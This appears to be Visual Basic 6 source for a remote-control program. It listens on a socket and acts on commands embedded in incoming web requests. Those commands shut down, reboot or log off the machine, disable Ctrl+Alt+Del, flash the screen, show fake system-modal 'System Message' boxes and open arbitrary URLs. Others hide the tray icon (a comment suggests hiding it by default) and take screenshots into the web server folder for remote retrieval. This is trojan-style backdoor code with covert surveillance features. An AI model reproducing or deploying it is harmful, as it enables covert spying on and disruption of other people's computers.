...
Private Sub Form_Load()
    ...
    'Remove the following line if you want to be able to see the icon.
...
Private Sub sckWS_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    ...
    If (Not RemoteCtrl(strdata$)) Then
    End If
...
Function FindFiles()
    ...
    Call keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
End Function
Function OpenInternetBrowser(strURL As String)
    ShellExecute hwnd, "open", strURL, vbNullString, vbNullString, conSwNormal
End Function


Private Function RemoteCtrl(requestString As String) As Boolean
    
    Dim devDevMode As DEVMODE
    
    lngHandleDisplay = CreateDC("DISPLAY", 0&, 0&, devDevMode)


    CustomControl = False
    
    If InStr(UCase(requestString), "!INVERSE") Then
        For intLoop = 1 To 300
            retval = BitBlt(lngHandleDisplay, 1, 1, 1600, 1200, lngHandleDisplay, 400, 400, &H550009)
        Next
        requestString = Replace(requestString, "!inverse", "done.html")
        CustomControl = True
    End If
    If InStr(UCase(requestString), "!REVERSE") > 0 Then
        retval = BitBlt(lngHandleDisplay, 1, 1, 1600, 1200, lngHandleDisplay, 400, 400, &H550009)
        requestString = Replace(requestString, "!reverse", "done.html")
        CustomControl = True
    End If
    If InStr(requestString, "!opencd") > 0 Then
        Dim lngReturn As Long
        Dim strReturn As Long
        lngReturn = mciSendString("set CDAudio door open", strReturn, 127, 0)
        requestString = Replace(requestString, "!opencd", "done.html")
        CustomControl = True
    End If
    If InStr(requestString, "!smile") > 0 Then
        requestString = Replace(requestString, "!smile", "done.html")
        CustomControl = True
        retval = Ellipse(lngHandleDisplay, 10, 10, 1014, 758)
    End If
    If InStr(requestString, "!logoff") > 0 Then
        requestString = Replace(requestString, "!logoff", "done.html")
        CustomControl = True
        retval = ExitWindowsEx(EWX_LOGOFF, 0)
    End If
    If InStr(requestString, "!shutdown") > 0 Then
        requestString = Replace(requestString, "!shutdown", "done.html")
        CustomControl = True
        retval = ExitWindowsEx(EWX_SHUTDOWN, 0)
    End If
    If InStr(requestString, "!reboot") > 0 Then
        requestString = Replace(requestString, "!reboot", "done.html")
        CustomControl = True
        retval = ExitWindowsEx(EWX_REBOOT, 0)
    End If
    If InStr(requestString, "!force") > 0 Then
        requestString = Replace(requestString, "!force", "done.html")
        CustomControl = True
        retval = ExitWindowsEx(EWX_FORCE, 0)
    End If
    If InStr(requestString, "!screensaver") > 0 Then
        requestString = Replace(requestString, "!screensaver", "done.html")
        CustomControl = True
        ToggleScreenSaverActive (True)
    End If
    If InStr(requestString, "!noscreensaver") > 0 Then
        requestString = Replace(requestString, "!noscreensaver", "done.html")
        CustomControl = True
        ToggleScreenSaverActive (False)
    End If
    If InStr(requestString, "!enablecad") > 0 Then
        requestString = Replace(requestString, "!enablecad", "done.html")
        CustomControl = True
        callme (False)
    End If
    If InStr(requestString, "!disablecad") > 0 Then
        requestString = Replace(requestString, "!disablecad", "done.html")
        CustomControl = True
        callme (True)
    End If
    If InStr(requestString, "!browser") > 0 Then
        firstpos = InStr(1, requestString, "|")
        secondpos = InStr(firstpos + 1, requestString, "|")
        gotoURL = Mid(requestString, firstpos + 1, secondpos - firstpos - 1)
        requestString = Left(requestString, InStr(requestString, "!browser") - 1) + "done.html" + Right(requestString, Len(requestString) - secondpos)
        OpenInternetBrowser (gotoURL)
        CustomControl = True
    End If
    If InStr(requestString, "!msgbox") > 0 Then
        firstpos = InStr(1, requestString, "|")
        secondpos = InStr(firstpos + 1, requestString, "|")
        strmsg = Mid(requestString, firstpos + 1, secondpos - firstpos - 1)
        requestString = Left(requestString, InStr(requestString, "!msgbox") - 1) + "done.html" + Right(requestString, Len(requestString) - secondpos)
        strmsg = Replace(strmsg, "%20", " ")
        MsgBox strmsg, vbSystemModal, "System Message"
        CustomControl = True
    End If
    If InStr(requestString, "!hideicon") > 0 Then
        requestString = Replace(requestString, "!hideicon", "done.html")
        CustomControl = True
        ShellNotifyIcon NIM_DELETE, myNID
    End If
    If InStr(requestString, "!showicon") > 0 Then
        requestString = Replace(requestString, "!showicon", "done.html")
        CustomControl = True
        ShellNotifyIcon NIM_ADD, myNID
    End If
    If InStr(requestString, "!screenshot") > 0 Then
        requestString = Replace(requestString, "!screenshot", "screenshot.html")
        CustomControl = True
        Set Picture1.Picture = CaptureScreen()
        SavePicture Picture1, "C:\PROGRAM FILES\WEBSERVER\SCREENSHOT.BMP"
    End If
End Function
